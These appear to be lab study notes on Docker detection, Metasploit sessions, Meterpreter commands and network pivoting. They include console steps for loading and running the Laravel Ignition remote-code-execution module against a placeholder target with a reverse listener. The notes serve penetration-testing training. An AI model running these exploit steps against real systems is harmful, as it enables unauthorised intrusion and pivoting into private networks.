                                                            ## What is Docker?
                                                            
# Docker is a way to package applications, and the associated dependencies into a single unit called an image.
# This image can then be shared and run as a container, either locally as a developer or remotely on a production server.
# A common way to tell if a compromised application is running in a Docker container is to verify the existence of a /.dockerenv file at the root directory of the filesystem.


                                                      ## What is Metasploit?
                                                      
# Metasploit is a powerful penetration testing tool for gaining initial access to systems, performing post-exploitation, and pivoting to other applications and systems.
# Metasploit is free, open-source software owned by the US-based cybersecurity firm Rapid7.

                                                        ## What is a Metasploit session?
                                                        
# After successfully exploiting a remote target with a Metasploit module, a session is often opened by default.
# These sessions are often Command Shells or Meterpreter sessions, which allow for executing commands against the target.
# It’s also possible to open up other session types in Metasploit, such as SSH or WinRM - which do not require payloads.

The common Metasploit console commands for viewing and manipulating sessions in Metasploit are:

# view sessions
sessions

# upgrade the last opened session to Meterpreter
sessions -u -1


# interact with a session
sessions -i session_id


# Background the currently interactive session, and go back to the Metasploit prompt
background




                                                    ## What is Meterpreter?
                                                    
# Meterpreter is an advanced payload that provides interactive access to a compromised system.
# Meterpreter supports running commands on a remote target, including uploading/downloading files and pivoting.

<> Meterpreter has multiple useful commands, such as the following:

# Get information about the remote system, such as OS
sysinfo

# Upload a file or directory
upload local_file.txt

# Display interfaces
ipconfig

# Resolve a set of host names on the target to IP addresses - useful for pivoting
resolve remote_service1 remote_service2

# Note that normal command shells do not support complex operations such as pivoting. 
# In Metasploit’s console, you can upgrade the last opened Metasploit session to a Meterpreter session with sessions -u -1

# You can identify the opened session types with the sessions command. 
# If you are currently interacting with a Meterpreter session, you must first background it.


                                                ## What is Pivoting?
# Once an attacker gains initial entry into a system, the compromised machine can be used to send additional web traffic through - allowing previously inaccessible machines to be reached.
# We can route network traffic through this compromised machine to run network scanning tools such as nmap or arp to find additional machines and services which were previously inaccessible to the pentester. This concept is called network pivoting.


                                      ## Using Metasploit
                                      
# If you are using the Web-based Kali machine or your own Kali machine, you can open Metasploit with the following msfconsole command:

<> After msfconsole is opened, there are multiple commands available:

           
# To search for a module, use the ‘search’ command:
msf6 > search laravel

# Load a module with the ‘use’ command
msf6 > use multi/php/ignition_laravel_debug_rce

# view the information about the module, including the module options, description, CVE details, etc
msf6 exploit(multi/php/ignition_laravel_debug_rce) > info

<> After using a Metasploit module, you can view the options, set options, and run the module:

           
# View the available options to set
show options

# Set the target host and logging
set rhost MACHINE_IP
set verbose true

# Set the payload listening address; this is the IP address of the host running Metasploit
set lhost LISTEN_IP

# show options again
show options

# Run or check the module
check
run


<> You can also directly set options from the run command:
